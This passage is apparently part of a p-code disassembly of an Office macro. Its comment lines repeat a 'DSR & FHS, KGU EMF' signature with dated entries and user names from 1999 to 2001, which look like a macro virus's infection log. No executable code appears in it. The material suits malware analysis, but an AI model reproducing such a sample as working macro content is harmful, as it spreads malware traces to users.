' Line #351:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #352:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #353:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #354:
' 	QuoteRem 0x0000 0x0024 " 10:34:42 - âîñêðåñåíüå, 23 èþë 2000"
' Line #355:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #356:
' 	QuoteRem 0x0000 0x0000 ""
' Line #357:
' Line #358:
' Line #359:
' Line #360:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #361:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #362:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #363:
' 	QuoteRem 0x0000 0x0024 " 11:45:27 - âîñêðåñåíüå, 23 èþë 2000"
' Line #364:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #365:
' 	QuoteRem 0x0000 0x0000 ""
' Line #366:
' Line #367:
' Line #368:
' Line #369:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #370:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #371:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #372:
' 	QuoteRem 0x0000 0x0020 " 11:53:05 - âòîðíèê, 25 èþë 2000"
' Line #373:
' 	QuoteRem 0x0000 0x0005 " CCTT"
' Line #374:
' 	QuoteRem 0x0000 0x0000 ""
' Line #375:
' Line #376:
' Line #377:
' Line #378:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #379:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #380:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #381:
' 	QuoteRem 0x0000 0x0020 " 08:53:34 - ÷åòâåðã, 27 èþë 2000"
' Line #382:
' 	QuoteRem 0x0000 0x000B " ðåàíèìàòîð"
' Line #383:
' 	QuoteRem 0x0000 0x0000 ""
' Line #384:
' Line #385:
' Line #386:
' Line #387:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #388:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #389:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #390:
' 	QuoteRem 0x0000 0x001F " 17:37:06 - âòîðíèê, 1 àâã 2000"
' Line #391:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #392:
' 	QuoteRem 0x0000 0x0000 ""
' Line #393:
' Line #394:
' Line #395:
' Line #396:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #397:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #398:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #399:
' 	QuoteRem 0x0000 0x001D " 12:46:13 - ñðåäà, 2 àâã 2000"
' Line #400:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #401:
' 	QuoteRem 0x0000 0x0000 ""
' Line #402:
' Line #403:
' Line #404:
' Line #405:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #406:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #407:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #408:
' 	QuoteRem 0x0000 0x001D " 18:22:38 - ñðåäà, 2 àâã 2000"
' Line #409:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #410:
' 	QuoteRem 0x0000 0x0000 ""
' Line #411:
' Line #412:
' Line #413:
' Line #414:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #415:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #416:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #417:
' 	QuoteRem 0x0000 0x0024 " 09:11:48 - ïîíåäåëüíèê, 21 àâã 2000"
' Line #418:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #419:
' 	QuoteRem 0x0000 0x0000 ""
' Line #420:
' Line #421:
' Line #422:
' Line #423:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #424:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #425:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #426:
' 	QuoteRem 0x0000 0x0024 " 15:01:19 - ïîíåäåëüíèê, 21 àâã 2000"
' Line #427:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #428:
' 	QuoteRem 0x0000 0x0000 ""
' Line #429:
' Line #430:
' Line #431:
' Line #432:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #433:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #434:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #435:
' 	QuoteRem 0x0000 0x0020 " 09:38:46 - âòîðíèê, 22 àâã 2000"
' Line #436:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #437:
' 	QuoteRem 0x0000 0x0000 ""
' Line #438:
' Line #439:
' Line #440:
' Line #441:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #442:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #443:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #444:
' 	QuoteRem 0x0000 0x0020 " 11:14:24 - ïÿòíèöà, 25 àâã 2000"
' Line #445:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #446:
' 	QuoteRem 0x0000 0x0000 ""
' Line #447:
' Line #448:
' Line #449:
' Line #450:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #451:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #452:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #453:
' 	QuoteRem 0x0000 0x0020 " 09:43:34 - ïÿòíèöà, 22 ñåí 2000"
' Line #454:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #455:
' 	QuoteRem 0x0000 0x0000 ""
' Line #456:
' Line #457:
' Line #458:
' Line #459:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #460:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #461:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #462:
' 	QuoteRem 0x0000 0x0020 " 13:22:22 - ïÿòíèöà, 22 ñåí 2000"
' Line #463:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #464:
' 	QuoteRem 0x0000 0x0000 ""
' Line #465:
' Line #466:
' Line #467:
' Line #468:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #469:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #470:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #471:
' 	QuoteRem 0x0000 0x0020 " 11:14:55 - âòîðíèê, 10 îêò 2000"
' Line #472:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #473:
' 	QuoteRem 0x0000 0x0000 ""
' Line #474:
' Line #475:
' Line #476:
' Line #477:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #478:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #479:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #480:
' 	QuoteRem 0x0000 0x0020 " 21:48:10 - ÷åòâåðã, 19 îêò 2000"
' Line #481:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #482:
' 	QuoteRem 0x0000 0x0000 ""
' Line #483:
' Line #484:
' Line #485:
' Line #486:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #487:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #488:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #489:
' 	QuoteRem 0x0000 0x001E " 16:24:45 - ñðåäà, 29 íîÿ 2000"
' Line #490:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #491:
' 	QuoteRem 0x0000 0x0000 ""
' Line #492:
' Line #493:
' Line #494:
' Line #495:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #496:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #497:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #498:
' 	QuoteRem 0x0000 0x0020 " 09:23:28 - ÷åòâåðã, 30 íîÿ 2000"
' Line #499:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #500:
' 	QuoteRem 0x0000 0x0000 ""
' Line #501:
' Line #502:
' Line #503:
' Line #504:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #505:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #506:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #507:
' 	QuoteRem 0x0000 0x0020 " 11:58:47 - ÷åòâåðã, 30 íîÿ 2000"
' Line #508:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #509:
' 	QuoteRem 0x0000 0x0000 ""
' Line #510:
' Line #511:
' Line #512:
' Line #513:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #514:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #515:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #516:
' 	QuoteRem 0x0000 0x001F " 11:36:47 - ïÿòíèöà, 1 äåê 2000"
' Line #517:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #518:
' 	QuoteRem 0x0000 0x0000 ""
' Line #519:
' Line #520:
' Line #521:
' Line #522:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #523:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #524:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #525:
' 	QuoteRem 0x0000 0x001F " 13:23:31 - ïÿòíèöà, 5 ÿíâ 2001"
' Line #526:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #527:
' 	QuoteRem 0x0000 0x0000 ""
' Line #528:
' Line #529:
' Line #530:
' Line #531:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #532:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #533:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #534:
' 	QuoteRem 0x0000 0x0023 " 11:54:34 - ïîíåäåëüíèê, 8 ÿíâ 2001"
' Line #535:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #536:
' 	QuoteRem 0x0000 0x0000 ""
' Line #537:
' Line #538:
' Line #539:
' Line #540:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #541:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #542:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #543:
' 	QuoteRem 0x0000 0x001F " 14:36:35 - âòîðíèê, 9 ÿíâ 2001"
' Line #544:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #545:
' 	QuoteRem 0x0000 0x0000 ""
' Line #546:
' Line #547:
' Line #548:
' Line #549:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #550:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #551:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #552:
' 	QuoteRem 0x0000 0x001F " 15:05:48 - âòîðíèê, 9 ÿíâ 2001"
' Line #553:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #554:
' 	QuoteRem 0x0000 0x0000 ""
' Line #555:
' Line #556:
' Line #557:
' Line #558:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #559:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #560:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #561:
' 	QuoteRem 0x0000 0x001F " 18:23:03 - âòîðíèê, 9 ÿíâ 2001"
' Line #562:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #563:
' 	QuoteRem 0x0000 0x0000 ""
' Line #564:
' Line #565:
' Line #566:
' Line #567:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #568:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #569:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #570:
' 	QuoteRem 0x0000 0x001E " 10:32:55 - ñðåäà, 10 ÿíâ 2001"
' Line #571:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #572:
' 	QuoteRem 0x0000 0x0000 ""
' Line #573:
' Line #574:
' Line #575:
' Line #576:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #577:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #578:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #579:
' 	QuoteRem 0x0000 0x0020 " 09:33:04 - ïÿòíèöà, 12 ÿíâ 2001"
' Line #580:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #581:
' 	QuoteRem 0x0000 0x0000 ""
' Line #582:
' Line #583:
' Line #584:
' Line #585:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #586:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #587:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #588:
' 	QuoteRem 0x0000 0x0020 " 13:48:13 - ïÿòíèöà, 12 ÿíâ 2001"
' Line #589:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #590:
' 	QuoteRem 0x0000 0x0000 ""
' Line #591:
' Line #592:
' Line #593:
' Line #594:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #595:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #596:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #597:
' 	QuoteRem 0x0000 0x0024 " 01:03:22 - ïîíåäåëüíèê, 15 ÿíâ 2001"
' Line #598:
' 	QuoteRem 0x0000 0x0007 " Jordan"
' Line #599:
' 	QuoteRem 0x0000 0x0000 ""
' Line #600:
' Line #601:
' Line #602:
' Line #603:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #604:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #605:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #606:
' 	QuoteRem 0x0000 0x001F " 18:08:12 - ïÿòíèöà, 2 ôåâ 2001"
' Line #607:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #608:
' 	QuoteRem 0x0000 0x0000 ""
' Line #609:
' Line #610:
' Line #611:
' Line #612:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #613:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #614:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #615:
' 	QuoteRem 0x0000 0x0020 " 17:49:01 - ïÿòíèöà, 16 ôåâ 2001"
' Line #616:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #617:
' 	QuoteRem 0x0000 0x0000 ""
' Line #618:
' Line #619:
' Line #620:
' Line #621:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #622:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #623:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #624:
' 	QuoteRem 0x0000 0x0020 " 13:12:13 - ñóááîòà, 17 ôåâ 2001"
' Line #625:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #626:
' 	QuoteRem 0x0000 0x0000 ""
' Line #627:
' Line #628:
' Line #629:
' Line #630:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #631:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #632:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #633:
' 	QuoteRem 0x0000 0x0020 " 13:35:12 - ñóááîòà, 17 ôåâ 2001"
' Line #634:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #635:
' 	QuoteRem 0x0000 0x0000 ""
' Line #636:
' Line #637:
' Line #638:
' Line #639:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #640:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #641:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #642:
' 	QuoteRem 0x0000 0x0020 " 13:35:19 - ñóááîòà, 17 ôåâ 2001"
' Line #643:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #644:
' 	QuoteRem 0x0000 0x0000 ""
' Line #645:
' Line #646:
' Line #647:
' Line #648:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #649:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #650:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #651:
' 	QuoteRem 0x0000 0x0020 " 13:35:26 - ñóááîòà, 17 ôåâ 2001"
' Line #652:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #653:
' 	QuoteRem 0x0000 0x0000 ""
' Line #654:
' Line #655:
' Line #656:
' Line #657:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #658:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #659:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #660:
' 	QuoteRem 0x0000 0x0020 " 13:35:31 - ñóááîòà, 17 ôåâ 2001"
' Line #661:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #662:
' 	QuoteRem 0x0000 0x0000 ""
' Line #663:
' Line #664:
' Line #665:
' Line #666:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #667:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #668:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #669:
' 	QuoteRem 0x0000 0x0020 " 13:35:37 - ñóááîòà, 17 ôåâ 2001"
' Line #670:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #671:
' 	QuoteRem 0x0000 0x0000 ""
' Line #672:
' Line #673:
' Line #674:
' Line #675:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #676:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #677:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #678:
' 	QuoteRem 0x0000 0x0020 " 13:35:44 - ñóááîòà, 17 ôåâ 2001"
' Line #679:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #680:
' 	QuoteRem 0x0000 0x0000 ""
' Line #681:
' Line #682:
' Line #683:
' Line #684:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #685:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #686:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #687:
' 	QuoteRem 0x0000 0x0020 " 13:35:49 - ñóááîòà, 17 ôåâ 2001"
' Line #688:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #689:
' 	QuoteRem 0x0000 0x0000 ""
' Line #690:
' Line #691:
' Line #692:
' Line #693:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #694:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #695:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #696:
' 	QuoteRem 0x0000 0x0020 " 13:35:55 - ñóááîòà, 17 ôåâ 2001"
' Line #697:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #698:
' 	QuoteRem 0x0000 0x0000 ""
' Line #699:
' Line #700:
' Line #701:
' Line #702:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #703:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #704:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #705:
' 	QuoteRem 0x0000 0x0020 " 13:36:01 - ñóááîòà, 17 ôåâ 2001"
' Line #706:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #707:
' 	QuoteRem 0x0000 0x0000 ""
' Line #708:
' Line #709:
' Line #710:
' Line #711:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #712:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #713:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #714:
' 	QuoteRem 0x0000 0x0020 " 13:45:17 - ñóááîòà, 17 ôåâ 2001"
' Line #715:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #716:
' 	QuoteRem 0x0000 0x0000 ""
' Line #717:
' Line #718:
' Line #719:
' Line #720:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #721:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #722:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #723:
' 	QuoteRem 0x0000 0x0020 " 13:49:57 - ñóááîòà, 17 ôåâ 2001"
' Line #724:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #725:
' 	QuoteRem 0x0000 0x0000 ""
' Line #726:
' Line #727:
' Line #728:
' Line #729:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #730:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #731:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #732:
' 	QuoteRem 0x0000 0x0020 " 14:40:56 - ñóááîòà, 17 ôåâ 2001"
' Line #733:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #734:
' 	QuoteRem 0x0000 0x0000 ""
' Line #735:
' Line #736:
' Line #737:
' Line #738:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #739:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #740:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #741:
' 	QuoteRem 0x0000 0x0020 " 14:41:22 - ñóááîòà, 17 ôåâ 2001"
' Line #742:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #743:
' 	QuoteRem 0x0000 0x0000 ""
' Line #744:
' Line #745:
' Line #746:
' Line #747:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #748:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #749:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #750:
' 	QuoteRem 0x0000 0x0020 " 16:51:31 - ñóááîòà, 17 ôåâ 2001"
' Line #751:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #752:
' 	QuoteRem 0x0000 0x0000 ""
' Line #753:
' Line #754:
' Line #755:
' Line #756:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #757:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #758:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #759:
' 	QuoteRem 0x0000 0x0024 " 12:45:33 - ïîíåäåëüíèê, 19 ôåâ 2001"
' Line #760:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #761:
' 	QuoteRem 0x0000 0x0000 ""
' Line #762:
' Line #763:
' Line #764:
' Line #765:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #766:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #767:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #768:
' 	QuoteRem 0x0000 0x0024 " 15:22:59 - ïîíåäåëüíèê, 19 ôåâ 2001"
' Line #769:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #770:
' 	QuoteRem 0x0000 0x0000 ""
' Line #771:
' Line #772:
' Line #773:
' Line #774:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #775:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #776:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #777:
' 	QuoteRem 0x0000 0x0020 " 13:23:52 - ïÿòíèöà, 10 ìàð 2000"
' Line #778:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #779:
' 	QuoteRem 0x0000 0x0000 ""
' Line #780:
' Line #781:
' Line #782:
' Line #783:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #784:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #785:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #786:
' 	QuoteRem 0x0000 0x0020 " 14:31:09 - ïÿòíèöà, 10 ìàð 2000"
' Line #787:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #788:
' 	QuoteRem 0x0000 0x0000 ""
' Line #789:
' Line #790:
' Line #791:
' Line #792:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #793:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #794:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #795:
' 	QuoteRem 0x0000 0x0020 " 14:35:05 - ïÿòíèöà, 10 ìàð 2000"
' Line #796:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #797:
' 	QuoteRem 0x0000 0x0000 ""
' Line #798:
' Line #799:
' Line #800:
' Line #801:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #802:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #803:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #804:
' 	QuoteRem 0x0000 0x0020 " 16:06:09 - ñóááîòà, 11 ìàð 2000"
' Line #805:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #806:
' 	QuoteRem 0x0000 0x0000 ""
' Line #807:
' Line #808:
' Line #809:
' Line #810:
